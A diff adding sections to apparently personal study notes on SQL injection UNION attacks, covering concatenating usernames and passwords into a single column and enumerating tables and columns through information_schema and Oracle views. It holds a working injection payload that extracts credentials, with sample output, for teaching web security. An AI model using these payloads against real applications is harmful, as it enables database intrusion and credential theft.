@@ -313,6 +313,80 @@ A SQL injection UNION attack enables you to retrieve the results from an injecte
 >```
 >In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.
 
+## Retrieving multiple values within a single column
+
+In some cases the query in the previous example may only return a single column.
+
+You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:
+
+
+```sql
+--- Oracle
+' UNION SELECT username || '~' || password FROM users--
+```
+```sql
+--- mysql
+SELECT CONCAT(first_name, ' ', last_name, ':', email) FROM users--
+```
+
+This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.
+
+The results from the query contain all the usernames and passwords, for example:
+
+```http
+administrator~s3cure
+wiener~peter 
+carlos~montoya 
+```
+
+Different databases use different syntax to perform string concatenation.
+## Listing the contents of the database
+
+Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.
+
+For example, you can query `information_schema.tables` to list the tables in the database:
+
+`SELECT * FROM information_schema.tables`
+
+This returns output like the following:
+
+```sql
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME   TABLE_TYPE =====================================================
+MyDatabase        dbo         Products     BASE TABLE 
+MyDatabase        dbo         Users        BASE TABLE
+MyDatabase        dbo         Feedback     BASE TABLE
+```
+
+This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.
+
+You can then query `information_schema.columns` to list the columns in individual tables:
+
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+This returns output like the following:
+```sql
+TABLE_CATALOG  TABLE_SCHEMA   TABLE_NAME  COLUMN_NAME   DATA_TYPE =================================================================
+MyDatabase         dbo          Users       UserId        int 
+MyDatabase         dbo          Users       Username      varchar 
+MyDatabase         dbo          Users       Password      varchar
+```
+
+This output shows the columns in the specified table and the data type of each column.
+On Oracle, you can find the same information as follows:
+
+- You can list tables by querying `all_tables`
+```sql
+SELECT * FROM all_tables
+``` 
+
+- You can list columns by querying `all_tab_columns`
+```sql
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+```
+
+
 > [!hint]
 > ```sql
 > select schema_name from information_schema.schemata
